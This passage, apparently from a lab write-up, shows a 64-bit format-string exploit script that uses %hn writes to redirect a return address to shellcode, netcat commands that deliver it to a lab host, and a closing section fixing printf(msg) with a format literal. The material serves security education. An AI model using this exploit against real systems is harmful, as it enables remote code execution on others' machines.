   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Choose the shellcode version based on your target
shellcode = shellcode_64

############################################################
#    Construct the format string here                      #
############################################################

# return address    = 0x00007fffffffe0d8
# buffer address    = 0x00007fffffffe190
# shellcode address = 0x00007fffffffe190 + 0x48 = 0x00007fffffffe1d8

r1 = 0x00007fffffffe0d8         # <-- 0xe1d8
r2 = 0x00007fffffffe0d8 + 2     # <-- 0xffff
r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000

# Create format string
# I pad zeros to keep the lenght at 16-bytes
content  = ("%.0032767x%40$hn").encode('latin-1')    # <-- 0x7fff
content += ("%.0025049x%41$hn").encode('latin-1')    # <-- 0xe1d8
content += ("%.0007719x%42$hn").encode('latin-1')    # <-- 0xffff

# Append addresses
content += (r3).to_bytes(8,byteorder='little')
content += (r1).to_bytes(8,byteorder='little')
content += (r2).to_bytes(8,byteorder='little')

# determine the size of content before adding the shellcode
#print(f"size of content before shellcode = {len(content)}")    # --> 72 = 0x48

# shellcode
content += shellcode


# Save the format string to file
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

Next is to set up a listener...

```bash
nc -nvl 9090
```

then run the attack.
```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.6 9090
```

![task-5-e](https://github.com/iukadike/blog/assets/58455326/ca5e6872-a435-49de-9a60-1c968137a1f6)


<details>
<summary>Code explanation</summary>
<div markdown="1">

I write out the addresses I will need for easy reference. I also map out the shellcode address to the return addresses where they will be stored. Remember, our machine is little endian.

```python
# return address    = 0x00007fffffffe0d8
# buffer address    = 0x00007fffffffe190
# shellcode address = 0x00007fffffffe190 + 0x48 = 0x00007fffffffe1d8

r1 = 0x00007fffffffe0d8         # <-- 0xe1d8
r2 = 0x00007fffffffe0d8 + 2     # <-- 0xffff
r3 = 0x00007fffffffe0d8 + 4     # <-- 0x7fff
r4 = 0x00007fffffffe0d8 + 6     # <-- 0x0000
```

I use the below block of code to initially print the offset from the start of the payload, where the shellcode will reside in memory. After running the program, I got a value of 72.

```python
# determine the size of content before adding the shellcode
#print(f"size of content before shellcode = {len(content)}")    # --> 72 = 0x48
```

I can now do the following:
- determine the shellcode address by adding the offset to the buffer address.
- use the calculated address to build the format specifiers

I create the format string by starting with the lowest value since the %x is cummulative. 0x7fff is the smallest value, so I start with this and increment till I have all the required values. I also place them into their respective addresses at the calculated offset.

```python
# Create format string
content  = ("%.0032767x%40$hn").encode('latin-1')    # <-- 0x7fff
content += ("%.0025049x%41$hn").encode('latin-1')    # <-- 0xe1d8
content += ("%.0007719x%42$hn").encode('latin-1')    # <-- 0xffff
```

The initial offset is 34; however, by keeping the format specifiers to a constant length of 16 bytes and knowing I am writing to 3 addresses, the total length of the format specifiers will be 16 * 3 = 48 bytes. But our program is 64-bit, meaning each address is 8 bytes. So to get the offset of the first address, we do 34 + (48 / 8) = 34 + 6 = 40.

The addresses come immediately after the format specifiers and are arranged in such a way that the values go into the correct addresses as previously mapped.

```python
# Append addresses
content += (r3).to_bytes(8,byteorder='little')
content += (r1).to_bytes(8,byteorder='little')
content += (r2).to_bytes(8,byteorder='little')
```

</div></details>


<br>

### Mitigating Format String Attack

At the start of the lab, when we compiled the programs, the gcc compiler printed out the below warning message:

```bash 
gcc -o server server.c
gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c
format.c: In function ‘myprintf’:
format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]
   44 |     printf(msg);
      |     ^~~~~~
gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c
format.c: In function ‘myprintf’:
format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]
   44 |     printf(msg);
      |     ^~~~~~
```

This error message tells us that the argument we are passing to the printf() function is not a string. Rather, we are directly passing a variable to the printf() function. It also brings our attention to the fact that there were no format specifiers included for the printf() to parse.

It is important that format specifiers have matching arguments to prevent issues like buffer overflows, memory leaks, or even arbitrary code execution.

To fix this warning and, in turn, the vulnerability, I would add a string literal with a format specifier that will parse the argument passed to the printf() function. The original code will be modified as below:

```c
// This line has a format-string vulnerability
//  printf(msg);
// This line does not have a format-string vulnerability
    printf("%s", msg);
```

After making the adjustment, the gcc compiler warning message disappears. All that's left is to relaunch the attacks to find out if they will fail or succeed.

![task-6-a](https://github.com/iukadike/blog/assets/58455326/2e6c4486-3ba3-4c10-a0b6-b118375c2cb3)


![task-6-b](https://github.com/iukadike/blog/assets/58455326/e83b7846-f5c8-4e19-8bc5-2dbca18d3392)


The attacks all fail.


<br>

Thanks for reading.
